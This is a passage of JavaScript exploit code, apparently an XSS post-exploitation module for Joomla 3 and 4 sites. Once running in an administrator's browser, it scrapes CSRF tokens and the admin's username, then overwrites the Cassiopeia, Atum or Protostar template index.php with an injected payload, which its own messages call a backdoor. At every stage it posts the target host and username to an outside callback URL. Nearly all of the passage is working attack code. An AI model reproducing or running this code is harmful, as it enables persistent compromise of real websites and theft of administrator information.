F%3E%0D%0A++++++++%3C%2Fdiv%3E%0D%0A++++%3C%2Ffooter%3E%0D%0A++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A++++%3C%3Fphp+if+%28%24this-%3Eparams-%3Eget%28%27backTop%27%29+%3D%3D+1%29+%3A+%3F%3E%0D%0A++++++++%3Ca+href%3D%22%23top%22+id%3D%22back-top%22+class%3D%22back-to-top-link%22+aria-label%3D%22%3C%3Fphp+echo+Text%3A%3A_%28%27TPL_CASSIOPEIA_BACKTOTOP%27%29%3B+%3F%3E%22%3E%0D%0A++++++++++++%3Cspan+class%3D%22icon-arrow-up+icon-fw%22+aria-hidden%3D%22true%22%3E%3C%2Fspan%3E%0D%0A++++++++%3C%2Fa%3E%0D%0A++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22debug%22+style%3D%22none%22+%2F%3E%0D%0A%3C%2Fbody%3E%0D%0A%3C%2Fhtml%3E%0D%0A" +
                    "&task=template.save&" +
                    csrf_token + "=1&jform%5Bextension_id%5D=" +
                    ID + "&jform%5Bfilename%5D=%2Fproc%2Fself%2Fcwd%2Findex.php"

                );

                // Check if the file was edited successfully
                if (_stage2.responseText.match("File saved.")) {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + templateURI,
                                    "Message": "(Stage 2) - (Cassiopeia) Template Edited Sucessfuly! <file: index.php>",
                                    "Module": "JLEditTemplates.Cassiopeia4()",
                                    "About": "You can trigger your backdoor in any application file/endpoint",
                                    "Targeted User": _usr,
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                } else {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + templateURI,
                                    "Message": "ERROR: (Stage 2) - Cannot Edit (Cassiopeia) Template",
                                    "Module": "JLEditTemplates.Cassiopeia4()",
                                    "About": "The user doesn't have (Super Users) Permission",
                                    "Targeted User": _usr,
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                }

            }

        } else {

            if (Callback) {
                var _callback = new XMLHttpRequest();
                _callback.open("POST", Callback, true);
                _callback.send(
                    JSON.stringify(
                        {
                            "Host": Target + "administrator/index.php?option=com_templates&view=templates&client_id=0",
                            "Module": "JLEditTemplates.Cassiopeia4()",
                            "Message": "ERROR: Stage 1 - (Cannot Get Server Response!)",
                            "Date": new Date().toUTCString()
                        }
                    )
                );
            }
        }

    }

    // Joomla 4.x.x Admin Template: (Atum)
    function Atum4() {

        if (Target.substr(-1) != '/') Target += '/';
        var _stage1 = new XMLHttpRequest();
        _stage1.open("GET", Target + "administrator/index.php?option=com_templates&view=templates&client_id=1", false);
        _stage1.send();

        if (_stage1.responseText) {

            if (_stage1.responseText.match("Joomla Administrator Login")) {
                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "administrator/index.php?option=com_templates&view=templates&client_id=1",
                                "Module": "JLEditTemplates.Atum4()",
                                "Message": "ERROR: Stage 1 - (The user affected by XSS lacks access to the Admin Panel)",
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }

            } else {

                // Identify the user who triggered the XSS
                var _usr = new XMLHttpRequest();
                _usr.open("GET", Target + "administrator/index.php?option=com_admin&view=profile&layout=edit", false);
                _usr.send();
                _usr = _usr.responseText.match(/<input[^>]*\sname=['"]jform\[username]['"][^>]*\svalue=['"]([^'"]*)['"][^>]*>/)[1];

                // Extract csrf_token
                var csrf_token = _stage1.responseText.match(/"csrf\.token":"([^"]+)"/)[1];

                // Extract (Atum) Template URI
                var templateURI = _stage1.responseText.match(/<a[^>]*\s*href\s*=\s*["']([^"']*)["'][^>]*>(?:\s*Atum Details and Files\s*)?<\/a>/i)[1];
                templateURI = templateURI.replace(/&amp;/g, '&');
                templateURI = templateURI.replace(/(\?|&)file=([^&]*)/, `$1file=L2luZGV4LnBocA`);
                templateURI = templateURI.substring(1);

                // Get the ID of the Template URI
                var ID = templateURI.match(/[?&]id=([^&]+)/)[1];

                // Edit index.php file
                var _stage2 = new XMLHttpRequest();
                _stage2.open("POST", Target + templateURI, false);
                _stage2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                _stage2.send(
                    "isMedia=0&jform%5Bsource%5D=%3C%3Fphp%0D%0A%0D%0A%2F**%0D%0A+*+%40package+++++Joomla.Administrator%0D%0A+*+%40subpackage++Templates.Atum%0D%0A+*+%40copyright+++%28C%29+2016+Open+Source+Matters%2C+Inc.+%3Chttps%3A%2F%2Fwww.joomla.org%3E%0D%0A+*+%40license+++++GNU+General+Public+License+version+2+or+later%3B+see+LICENSE.txt%0D%0A+*+%40since+++++++4.0.0%0D%0A+*%2F%0D%0A%0D%0Adefined%28%27_JEXEC%27%29+or+die%3B%0D%0A%0D%0Ause+Joomla%5CCMS%5CFactory%3B%0D%0Ause+Joomla%5CCMS%5CHTML%5CHTMLHelper%3B%0D%0Ause+Joomla%5CCMS%5CLanguage%5CText%3B%0D%0Ause+Joomla%5CCMS%5CLayout%5CLayoutHelper%3B%0D%0Ause+Joomla%5CCMS%5CRouter%5CRoute%3B%0D%0Ause+Joomla%5CCMS%5CUri%5CUri%3B%0D%0A%0D%0A%2F**+%40var+%5CJoomla%5CCMS%5CDocument%5CHtmlDocument+%24this+*%2F%0D%0A%0D%0A%24app+++%3D+Factory%3A%3AgetApplication%28%29%3B%0D%0A%24input+%3D+%24app-%3EgetInput%28%29%3B%0D%0A%24wa++++%3D+%24this-%3EgetWebAssetManager%28%29%3B%0D%0A%0D%0A%2F%2F+Detecting+Active+Variables%0D%0A%24option+++++++%3D+%24input-%3Eget%28%27option%27%2C+%27%27%29%3B%0D%0A%24view+++++++++%3D+%24input-%3Eget%28%27view%27%2C+%27%27%29%3B%0D%0A%24layout+++++++%3D+%24input-%3Eget%28%27layout%27%2C+%27default%27%29%3B%0D%0A%24task+++++++++%3D+%24input-%3Eget%28%27task%27%2C+%27display%27%29%3B%0D%0A%24cpanel+++++++%3D+%24option+%3D%3D%3D+%27com_cpanel%27+%7C%7C+%28%24option+%3D%3D%3D+%27com_admin%27+%26%26+%24view+%3D%3D%3D+%27help%27%29%3B%0D%0A%24hiddenMenu+++%3D+%24app-%3EgetInput%28%29-%3Eget%28%27hidemainmenu%27%29%3B%0D%0A%24sidebarState+%3D+%24input-%3Ecookie-%3Eget%28%27atumSidebarState%27%2C+%27%27%29%3B%0D%0A%0D%0A%2F%2F+Getting+user+accessibility+settings%0D%0A%24a11y_mono++++++%3D+%28bool%29+%24app-%3EgetIdentity%28%29-%3EgetParam%28%27a11y_mono%27%2C+%27%27%29%3B%0D%0A%24a11y_contrast++%3D+%28bool%29+%24app-%3EgetIdentity%28%29-%3EgetParam%28%27a11y_contrast%27%2C+%27%27%29%3B%0D%0A%24a11y_highlight+%3D+%28bool%29+%24app-%3EgetIdentity%28%29-%3EgetParam%28%27a11y_highlight%27%2C+%27%27%29%3B%0D%0A%24a11y_font++++++%3D+%28bool%29+%24app-%3EgetIdentity%28%29-%3EgetParam%28%27a11y_font%27%2C+%27%27%29%3B%0D%0A%0D%0A%2F%2F+Browsers+support+SVG+favicons%0D%0A%24this-%3EaddHeadLink%28HTMLHelper%3A%3A_%28%27image%27%2C+%27joomla-favicon.svg%27%2C+%27%27%2C+%5B%5D%2C+true%2C+1%29%2C+%27icon%27%2C+%27rel%27%2C+%5B%27type%27+%3D%3E+%27image%2Fsvg%2Bxml%27%5D%29%3B%0D%0A%24this-%3EaddHeadLink%28HTMLHelper%3A%3A_%28%27image%27%2C+%27favicon.ico%27%2C+%27%27%2C+%5B%5D%2C+true%2C+1%29%2C+%27alternate+icon%27%2C+%27rel%27%2C+%5B%27type%27+%3D%3E+%27image%2Fvnd.microsoft.icon%27%5D%29%3B%0D%0A%24this-%3EaddHeadLink%28HTMLHelper%3A%3A_%28%27image%27%2C+%27joomla-favicon-pinned.svg%27%2C+%27%27%2C+%5B%5D%2C+true%2C+1%29%2C+%27mask-icon%27%2C+%27rel%27%2C+%5B%27color%27+%3D%3E+%27%23000%27%5D%29%3B%0D%0A%0D%0A%2F%2F+Template+params%0D%0A%24logoBrandLarge++%3D+%24this-%3Eparams-%3Eget%28%27logoBrandLarge%27%29%0D%0A++++%3F+Uri%3A%3Aroot%28false%29+.+htmlspecialchars%28%24this-%3Eparams-%3Eget%28%27logoBrandLarge%27%29%2C+ENT_QUOTES%29%0D%0A++++%3A+Uri%3A%3Aroot%28false%29+.+%27media%2Ftemplates%2Fadministrator%2Fatum%2Fimages%2Flogos%2Fbrand-large.svg%27%3B%0D%0A%24logoBrandSmall+%3D+%24this-%3Eparams-%3Eget%28%27logoBrandSmall%27%29%0D%0A++++%3F+Uri%3A%3Aroot%28false%29+.+htmlspecialchars%28%24this-%3Eparams-%3Eget%28%27logoBrandSmall%27%29%2C+ENT_QUOTES%29%0D%0A++++%3A+Uri%3A%3Aroot%28false%29+.+%27media%2Ftemplates%2Fadministrator%2Fatum%2Fimages%2Flogos%2Fbrand-small.svg%27%3B%0D%0A%0D%0A%24logoBrandLargeAlt+%3D+empty%28%24this-%3Eparams-%3Eget%28%27logoBrandLargeAlt%27%29%29+%26%26+empty%28%24this-%3Eparams-%3Eget%28%27emptyLogoBrandLargeAlt%27%29%29%0D%0A++++%3F+%27%27%0D%0A++++%3A+htmlspecialchars%28%24this-%3Eparams-%3Eget%28%27logoBrandLargeAlt%27%2C+%27%27%29%2C+ENT_COMPAT%2C+%27UTF-8%27%29%3B%0D%0A%24logoBrandSmallAlt+%3D+empty%28%24this-%3Eparams-%3Eget%28%27logoBrandSmallAlt%27%29%29+%26%26+empty%28%24this-%3Eparams-%3Eget%28%27emptyLogoBrandSmallAlt%27%29%29%0D%0A++++%3F+%27%27%0D%0A++++%3A+htmlspecialchars%28%24this-%3Eparams-%3Eget%28%27logoBrandSmallAlt%27%2C+%27%27%29%2C+ENT_COMPAT%2C+%27UTF-8%27%29%3B%0D%0A%0D%0A%2F%2F+Get+the+hue+value%0D%0Apreg_match%28%27%23%5Ehsla%3F%5C%28%28%5B0-9%5D%2B%29%5B%5CD%5D%2B%28%5B0-9%5D%2B%29%5B%5CD%5D%2B%28%5B0-9%5D%2B%29%5B%5CD%5D%2B%28%5B0-9%5D%28%3F%3A.%5Cd%2B%29%3F%29%3F%5C%29%24%23i%27%2C+%24this-%3Eparams-%3Eget%28%27hue%27%2C+%27hsl%28214%2C+63%25%2C+20%25%29%27%29%2C+%24matches%29%3B%0D%0A%0D%0A%24linkColor+%3D+%24this-%3Eparams-%3Eget%28%27link-color%27%2C+%27%232a69b8%27%29%3B%0D%0Alist%28%24r%2C+%24g%2C+%24b%29+%3D+sscanf%28%24linkColor%2C+%22%23%2502x%2502x%2502x%22%29%3B%0D%0A%0D%0A%24linkColorDark+%3D+%24this-%3Eparams-%3Eget%28%27link-color-dark%27%2C+%27%237fa5d4%27%29%3B%0D%0Alist%28%24rd%2C+%24gd%2C+%24bd%29+%3D+sscanf%28%24linkColorDark%2C+%22%23%2502x%2502x%2502x%22%29%3B%0D%0A%0D%0A" +
                    encodeURIComponent(payload) +
                    "%0D%0A%0D%0A%2F%2F+Enable+assets%0D%0A%24wa-%3EusePreset%28%27template.atum.%27+.+%28%24this-%3Edirection+%3D%3D%3D+%27rtl%27+%3F+%27rtl%27+%3A+%27ltr%27%29%29%0D%0A++++-%3EuseStyle%28%27template.active.language%27%29%0D%0A++++-%3EuseStyle%28%27template.user%27%29%0D%0A++++-%3EaddInlineStyle%28%27%3Aroot+%7B%0D%0A%09%09--hue%3A+%27+.+%24matches%5B1%5D+.+%27%3B%0D%0A%09%09--template-bg-light%3A+%27+.+%24this-%3Eparams-%3Eget%28%27bg-light%27%2C+%27%23f0f4fb%27%29+.+%27%3B%0D%0A%09%09--template-text-dark%3A+%27+.+%24this-%3Eparams-%3Eget%28%27text-dark%27%2C+%27%23495057%27%29+.+%27%3B%0D%0A%09%09--template-text-light%3A+%27+.+%24this-%3Eparams-%3Eget%28%27text-light%27%2C+%27%23ffffff%27%29+.+%27%3B%0D%0A%09%09--link-color%3A+%27+.+%24linkColor+.+%27%3B%0D%0A%09%09--link-color-rgb%3A+%27+.+%24r+.+%27%2C%27+.+%24g+.+%27%2C%27+.+%24b+.+%27%3B%0D%0A%09%09--template-special-color%3A+%27+.+%24this-%3Eparams-%3Eget%28%27special-color%27%2C+%27%23001B4C%27%29+.+%27%3B%0D%0A%09%7D%27%29%0D%0A++++-%3EaddInlineStyle%28%27%40media+%28prefers-color-scheme%3A+dark%29+%7B+%3Aroot+%7B%0D%0A%09%09--link-color%3A+%27+.+%24linkColorDark+.+%27%3B%0D%0A%09%09--link-color-rgb%3A+%27+.+%24rd+.+%27%2C%27+.+%24gd+.+%27%2C%27+.+%24bd+.+%27%3B%0D%0A%09%7D%7D%27%29%3B%0D%0A%0D%0A%2F%2F+Override+%27template.active%27+asset+to+set+correct+ltr%2Frtl+dependency%0D%0A%24wa-%3EregisterStyle%28%27template.active%27%2C+%27%27%2C+%5B%5D%2C+%5B%5D%2C+%5B%27template.atum.%27+.+%28%24this-%3Edirection+%3D%3D%3D+%27rtl%27+%3F+%27rtl%27+%3A+%27ltr%27%29%5D%29%3B%0D%0A%0D%0A%2F%2F+Set+some+meta+data%0D%0A%24this-%3EsetMetaData%28%27viewport%27%2C+%27width%3Ddevice-width%2C+initial-scale%3D1%27%29%3B%0D%0A%0D%0A%24monochrome+%3D+%28bool%29+%24this-%3Eparams-%3Eget%28%27monochrome%27%29%3B%0D%0A%0D%0AText%3A%3Ascript%28%27TPL_ATUM_MORE_ELEMENTS%27%29%3B%0D%0A%0D%0A%2F%2F+%40see+administrator%2Ftemplates%2Fatum%2Fhtml%2Flayouts%2Fstatus.php%0D%0A%24statusModules+%3D+LayoutHelper%3A%3Arender%28%27status%27%2C+%5B%27modules%27+%3D%3E+%27status%27%5D%29%3B%0D%0A%3F%3E%0D%0A%3C%21DOCTYPE+html%3E%0D%0A%3Chtml+lang%3D%22%3C%3Fphp+echo+%24this-%3Elanguage%3B+%3F%3E%22+dir%3D%22%3C%3Fphp+echo+%24this-%3Edirection%3B+%3F%3E%22%3C%3Fphp+echo+%24a11y_font+%3F+%27+class%3D%22a11y_font%22%27+%3A+%27%27%3B+%3F%3E%3E%0D%0A%3Chead%3E%0D%0A++++%3Cjdoc%3Ainclude+type%3D%22metas%22+%2F%3E%0D%0A++++%3Cjdoc%3Ainclude+type%3D%22styles%22+%2F%3E%0D%0A++++%3Cjdoc%3Ainclude+type%3D%22scripts%22+%2F%3E%0D%0A%3C%2Fhead%3E%0D%0A%0D%0A%3Cbody+data-color-scheme-os+class%3D%22admin+%3C%3Fphp+echo+%24option+.+%27+view-%27+.+%24view+.+%27+layout-%27+.+%24layout+.+%28%24task+%3F+%27+task-%27+.+%24task+%3A+%27%27%29+.+%28%24monochrome+%7C%7C+%24a11y_mono+%3F+%27+monochrome%27+%3A+%27%27%29+.+%28%24a11y_contrast+%3F+%27+a11y_contrast%27+%3A+%27%27%29+.+%28%24a11y_highlight+%3F+%27+a11y_highlight%27+%3A+%27%27%29%3B+%3F%3E%22%3E%0D%0A%3Cnoscript%3E%0D%0A++++%3Cdiv+class%3D%22alert+alert-danger%22+role%3D%22alert%22%3E%0D%0A++++++++%3C%3Fphp+echo+Text%3A%3A_%28%27JGLOBAL_WARNJAVASCRIPT%27%29%3B+%3F%3E%0D%0A++++%3C%2Fdiv%3E%0D%0A%3C%2Fnoscript%3E%0D%0A%0D%0A%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22customtop%22+style%3D%22none%22+%2F%3E%0D%0A%0D%0A%3C%3Fphp+%2F%2F+Header+%3F%3E%0D%0A%3Cheader+id%3D%22header%22+class%3D%22header%22%3E%0D%0A++++%3Cdiv+class%3D%22header-inside%22%3E%0D%0A++++++++%3Cdiv+class%3D%22header-title+d-flex%22%3E%0D%0A++++++++++++%3Cdiv+class%3D%22d-flex+align-items-center%22%3E%0D%0A++++++++++++++++%3C%3Fphp+%2F%2F+No+home+link+in+edit+mode+%28so+users+can+not+jump+out%29+and+control+panel+%28for+a11y+reasons%29+%3F%3E%0D%0A++++++++++++++++%3C%3Fphp+if+%28%24hiddenMenu+%7C%7C+%24cpanel%29+%3A+%3F%3E%0D%0A++++++++++++++++++++%3Cdiv+class%3D%22logo+%3C%3Fphp+echo+%24sidebarState+%3D%3D%3D+%27closed%27+%3F+%27small%27+%3A+%27%27%3B+%3F%3E%22%3E%0D%0A++++++++++++++++++++++++%3C%3Fphp+echo+HTMLHelper%3A%3A_%28%27image%27%2C+%24logoBrandLarge%2C+%24logoBrandLargeAlt%2C+%5B%27loading%27+%3D%3E+%27eager%27%2C+%27decoding%27+%3D%3E+%27async%27%5D%2C+false%2C+0%29%3B+%3F%3E%0D%0A++++++++++++++++++++++++%3C%3Fphp+echo+HTMLHelper%3A%3A_%28%27image%27%2C+%24logoBrandSmall%2C+%24logoBrandSmallAlt%2C+%5B%27class%27+%3D%3E+%27logo-collapsed%27%2C+%27loading%27+%3D%3E+%27eager%27%2C+%27decoding%27+%3D%3E+%27async%27%5D%2C+false%2C+0%29%3B+%3F%3E%0D%0A++++++++++++++++++++%3C%2Fdiv%3E%0D%0A++++++++++++++++%3C%3Fphp+else+%3A+%3F%3E%0D%0A++++++++++++++++++++%3Ca+class%3D%22logo+%3C%3Fphp+echo+%24sidebarState+%3D%3D%3D+%27closed%27+%3F+%27small%27+%3A+%27%27%3B+%3F%3E%22+href%3D%22%3C%3Fphp+echo+Route%3A%3A_%28%27index.php%27%29%3B+%3F%3E%22%3E%0D%0A++++++++++++++++++++++++%3C%3Fphp+echo+HTMLHelper%3A%3A_%28%27image%27%2C+%24logoBrandLarge%2C+Text%3A%3A_%28%27TPL_ATUM_BACK_TO_CONTROL_PANEL%27%29%2C+%5B%27loading%27+%3D%3E+%27eager%27%2C+%27decoding%27+%3D%3E+%27async%27%5D%2C+false%2C+0%29%3B+%3F%3E%0D%0A++++++++++++++++++++++++%3C%3Fphp+echo+HTMLHelper%3A%3A_%28%27image%27%2C+%24logoBrandSmall%2C+Text%3A%3A_%28%27TPL_ATUM_BACK_TO_CONTROL_PANEL%27%29%2C+%5B%27class%27+%3D%3E+%27logo-collapsed%27%2C+%27loading%27+%3D%3E+%27eager%27%2C+%27decoding%27+%3D%3E+%27async%27%5D%2C+false%2C+0%29%3B+%3F%3E%0D%0A++++++++++++++++++++%3C%2Fa%3E%0D%0A++++++++++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A++++++++++++%3C%2Fdiv%3E%0D%0A++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22title%22+%2F%3E%0D%0A++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+echo+%24statusModules%3B+%3F%3E%0D%0A++++%3C%2Fdiv%3E%0D%0A%3C%2Fheader%3E%0D%0A%0D%0A%3C%3Fphp+%2F%2F+Wrapper+%3F%3E%0D%0A%3Cdiv+id%3D%22wrapper%22+class%3D%22d-flex+wrapper%3C%3Fphp+echo+%24hiddenMenu+%3F+%270%27+%3A+%27%27%3B+%3F%3E+%3C%3Fphp+echo+%24sidebarState%3B+%3F%3E%22%3E%0D%0A++++%3C%3Fphp+%2F%2F+Sidebar+%3F%3E%0D%0A++++%3C%3Fphp+if+%28%21%24hiddenMenu%29+%3A+%3F%3E%0D%0A++++++++%3C%3Fphp+HTMLHelper%3A%3A_%28%27bootstrap.collapse%27%2C+%27.toggler-burger%27%29%3B+%3F%3E%0D%0A++++++++%3Cbutton+class%3D%22navbar-toggler+toggler-burger+collapsed%22+type%3D%22button%22+data-bs-toggle%3D%22collapse%22+data-bs-target%3D%22%23sidebar-wrapper%22+aria-controls%3D%22sidebar-wrapper%22+aria-expanded%3D%22false%22+aria-label%3D%22%3C%3Fphp+echo+Text%3A%3A_%28%27JTOGGLE_SIDEBAR_MENU%27%29%3B+%3F%3E%22%3E%0D%0A++++++++++++%3Cspan+class%3D%22navbar-toggler-icon%22%3E%3C%2Fspan%3E%0D%0A++++++++%3C%2Fbutton%3E%0D%0A%0D%0A++++++++%3Cdiv+id%3D%22sidebar-wrapper%22+class%3D%22sidebar-wrapper+sidebar-menu%22+%3C%3Fphp+echo+%24hiddenMenu+%3F+%27data-hidden%3D%22%27+.+%24hiddenMenu+.+%27%22%27+%3A+%27%27%3B+%3F%3E%3E%0D%0A++++++++++++%3Cdiv+id%3D%22sidebarmenu%22+class%3D%22sidebar-sticky%22%3E%0D%0A++++++++++++++++%3Cdiv+class%3D%22sidebar-toggle+item+item-level-1%22%3E%0D%0A++++++++++++++++++++%3Ca+id%3D%22menu-collapse%22+href%3D%22%23%22+aria-label%3D%22%3C%3Fphp+echo+Text%3A%3A_%28%27JTOGGLE_SIDEBAR_MENU%27%29%3B+%3F%3E%22%3E%0D%0A++++++++++++++++++++++++%3Cspan+id%3D%22menu-collapse-icon%22+class%3D%22%3C%3Fphp+echo+%24sidebarState+%3D%3D%3D+%27closed%27+%3F+%27icon-toggle-on%27+%3A+%27icon-toggle-off%27%3B+%3F%3E+icon-fw%22+aria-hidden%3D%22true%22%3E%3C%2Fspan%3E%0D%0A++++++++++++++++++++++++%3Cspan+class%3D%22sidebar-item-title%22%3E%3C%3Fphp+echo+Text%3A%3A_%28%27JTOGGLE_SIDEBAR_MENU%27%29%3B+%3F%3E%3C%2Fspan%3E%0D%0A++++++++++++++++++++%3C%2Fa%3E%0D%0A++++++++++++++++%3C%2Fdiv%3E%0D%0A++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22menu%22+style%3D%22none%22+%2F%3E%0D%0A++++++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%2Fdiv%3E%0D%0A++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A%0D%0A++++%3C%3Fphp+%2F%2F+container-fluid+%3F%3E%0D%0A++++%3Cdiv+class%3D%22container-fluid+container-main%22%3E%0D%0A++++++++%3C%3Fphp+if+%28%21%24cpanel%29+%3A+%3F%3E%0D%0A++++++++++++%3C%3Fphp+%2F%2F+Subheader+%3F%3E%0D%0A++++++++++++%3C%3Fphp+HTMLHelper%3A%3A_%28%27bootstrap.collapse%27%2C+%27.toggler-toolbar%27%29%3B+%3F%3E%0D%0A++++++++++++%3Cbutton+class%3D%22navbar-toggler+toggler-toolbar+toggler-burger+collapsed%22+type%3D%22button%22+data-bs-toggle%3D%22collapse%22+data-bs-target%3D%22%23subhead-container%22+aria-controls%3D%22subhead-container%22+aria-expanded%3D%22false%22+aria-label%3D%22%3C%3Fphp+echo+Text%3A%3A_%28%27TPL_ATUM_TOOLBAR%27%29%3B+%3F%3E%22%3E%0D%0A++++++++++++++++%3Cspan+class%3D%22toggler-toolbar-icon%22%3E%3C%2Fspan%3E%0D%0A++++++++++++%3C%2Fbutton%3E%0D%0A++++++++++++%3Cdiv+id%3D%22subhead-container%22+class%3D%22subhead+mb-3%22%3E%0D%0A++++++++++++++++%3Cdiv+class%3D%22row%22%3E%0D%0A++++++++++++++++++++%3Cdiv+class%3D%22col-md-12%22%3E%0D%0A++++++++++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22toolbar%22+style%3D%22none%22+%2F%3E%0D%0A++++++++++++++++++++%3C%2Fdiv%3E%0D%0A++++++++++++++++%3C%2Fdiv%3E%0D%0A++++++++++++%3C%2Fdiv%3E%0D%0A++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A++++++++%3Csection+id%3D%22content%22+class%3D%22content%22%3E%0D%0A++++++++++++%3C%3Fphp+%2F%2F+Begin+Content+%3F%3E%0D%0A++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22top%22+style%3D%22html5%22+%2F%3E%0D%0A++++++++++++%3Cdiv+class%3D%22row%22%3E%0D%0A++++++++++++++++%3Cdiv+class%3D%22col-md-12%22%3E%0D%0A++++++++++++++++++++%3Cmain%3E%0D%0A++++++++++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22message%22+%2F%3E%0D%0A++++++++++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22component%22+%2F%3E%0D%0A++++++++++++++++++++%3C%2Fmain%3E%0D%0A++++++++++++++++%3C%2Fdiv%3E%0D%0A++++++++++++++++%3C%3Fphp+if+%28%24this-%3EcountModules%28%27bottom%27%29%29+%3A+%3F%3E%0D%0A++++++++++++++++++++%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22bottom%22+style%3D%22html5%22+%2F%3E%0D%0A++++++++++++++++%3C%3Fphp+endif%3B+%3F%3E%0D%0A++++++++++++%3C%2Fdiv%3E%0D%0A++++++++++++%3C%3Fphp+%2F%2F+End+Content+%3F%3E%0D%0A++++++++%3C%2Fsection%3E%0D%0A++++%3C%2Fdiv%3E%0D%0A%3C%2Fdiv%3E%0D%0A%3Cjdoc%3Ainclude+type%3D%22modules%22+name%3D%22debug%22+style%3D%22none%22+%2F%3E%0D%0A%3C%2Fbody%3E%0D%0A%3C%2Fhtml%3E%0D%0A" +
                    "&task=template.save&" +
                    csrf_token + "=1&jform%5Bextension_id%5D=" +
                    ID + "&jform%5Bfilename%5D=%2Fvar%2Fwww%2Fhtml%2Fadministrator%2Ftemplates%2Fatum%2Findex.php"

                );

                // Check if the file was edited successfully
                if (_stage2.responseText.match("File saved.")) {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + templateURI,
                                    "Message": "(Stage 2) - (Atum) Template Edited Sucessfuly! <file: index.php>",
                                    "Module": "JLEditTemplates.Atum4()",
                                    "About": "You can trigger your backdoor in file/endpoint on the Administrator Panel",
                                    "Targeted User": _usr,
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                } else {

                    if (Callback) {
                        var _callback = new XMLHttpRequest();
                        _callback.open("POST", Callback, true);
                        _callback.send(
                            JSON.stringify(
                                {
                                    "Host": Target + templateURI,
                                    "Message": "ERROR: (Stage 2) - Cannot Edit (Atum) Template",
                                    "Module": "JLEditTemplates.Atum4()",
                                    "About": "The user doesn't have (Super Users) Permission",
                                    "Targeted User": _usr,
                                    "Date": new Date().toUTCString()
                                }
                            )
                        );
                    }

                }

            }

        } else {

            if (Callback) {
                var _callback = new XMLHttpRequest();
                _callback.open("POST", Callback, true);
                _callback.send(
                    JSON.stringify(
                        {
                            "Host": Target + "administrator/index.php?option=com_templates&view=templates&client_id=1",
                            "Module": "JLEditTemplates.Atum4()",
                            "Message": "ERROR: Stage 1 - (Cannot Get Server Response!)",
                            "Date": new Date().toUTCString()
                        }
                    )
                );
            }
        }

    }

    // Joomla 3.x.x Site Template: (Protostar)
    function Protostar() {

        if (Target.substr(-1) != '/') Target += '/';
        var _stage1 = new XMLHttpRequest();
        _stage1.open("GET", Target + "administrator/index.php?option=com_templates&view=templates", false);
        _stage1.send();

        if (_stage1.responseText) {

            if (_stage1.responseText.match("Joomla Administrator Login")) {
                if (Callback) {
                    var _callback = new XMLHttpRequest();
                    _callback.open("POST", Callback, true);
                    _callback.send(
                        JSON.stringify(
                            {
                                "Host": Target + "administrator/index.php?option=com_templates&view=templates",
                                "Module": "JLEditTemplates.Protostar()",
                                "Message": "ERROR: Stage 1 - (The user affected by XSS lacks access to the Admin Panel)",
                                "Date": new Date().toUTCString()
                            }
                        )
                    );
                }

            } else {

                // Identify the user who triggered the XSS
                var _usr = new XMLHttpRequest();
                _usr.open("GET", Target + "administrator/index.php?option=com_admin&view=profile&layout=edit", false);
                _usr.send();
                _usr = _usr.responseText.match(/<input[^>]*\sname=['"]jform\[username]['"][^>]*\svalue=['"]([^'"]*)['"][^>]*>/)[1];

                // Extract csrf_token
                var csrf_token = _stage1.responseText.match(/&amp;([a-zA-Z0-9_-]+)=1/)[1];

                // Extract (Protostar) Template URI
                var templateURI = _stage1.responseText.match(/<a[^>]*\s*href\s*=\s*["']([^"']*)["'][^>]*>(?:\s*Protostar Details and Files\s*)?<\/a>/i)[1];
                templateURI = templateURI.replace(/&amp;/g, '&');
                templateURI = templateURI.replace(/(\?|&)file=([^&]*)/, `$1file=L2luZGV4LnBocA`);
                templateURI = templateURI.substring(1);

                // Get the ID of the Template URI
                var ID = templateURI.match(/[?&]id=([^&]+)/)[1];

                // Edit index.php file
                var _stage2 = new XMLHttpRequest();
                _stage2.open("POST", Target + templateURI, false);
                _stage2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
                _stage2.send(
